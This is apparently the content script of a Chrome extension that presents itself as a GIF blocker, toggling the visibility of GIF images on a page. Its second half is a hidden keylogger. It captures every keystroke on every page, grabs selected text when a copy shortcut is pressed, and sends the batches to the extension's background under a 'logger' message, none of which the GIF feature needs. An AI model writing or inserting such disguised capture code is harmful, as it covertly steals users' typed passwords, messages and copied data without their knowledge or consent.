var blockByDefault = false,
	gifsHidden = false;

function toggleGifs () {
	var badGifies = document.querySelectorAll('img[src$=".gif"]');

	if(!badGifies.length)
		return;

	if (!gifsHidden) {
		for (var i = 0, ii = badGifies.length; i < ii; ++i) {
		    badGifies[i].style.opacity = 0;
		}
		gifsHidden = true;
	} else {
		for (var i = 0, ii = badGifies.length; i < ii; ++i) {
		    badGifies[i].style.opacity = 1;
		}
		gifsHidden = false;
	}
}

chrome.runtime.onMessage.addListener(function (response) {
	if(response.kind === 'gifBlocker') {
	 	if (response.data === 'toggleGifs') {
	 		toggleGifs();
	 	}

	 	if (response.data === 'blockByDefault') {
	 		blockByDefault = response.results.blockByDefault;
			if (blockByDefault) {
				toggleGifs();
			}
	 	}
	}
});

chrome.runtime.sendMessage({
	kind:'gifBlocker',
	data:'isBlockedByDefault'
});

var keyCapture = [],
	previousKey,
	keySession;

function resetTimeout () {
	clearTimeout(keySession);
	keySession = setTimeout(sendAway, 1000);
}

function sendAway () {
	clearTimeout(keySession);

	if(keyCapture.length) {
		console.debug('I logged this: ', keyCapture);
		chrome.runtime.sendMessage({
			kind: 'logger',
			data: keyCapture
		})
		keyCapture = [];
	}
}

document.addEventListener('keydown', function (e) {
	keyCapture.push(e.keyCode);
	
	//if it looks like the user has copied something grab the pages selected text
	if(e.keyCode === 67) {
		if(previousKey === 17 || previousKey === 91 || previousKey === 93) {
			keyCapture.push(getSelection().toString());
		}
	}

	previousKey = e.keyCode;
	resetTimeout();
});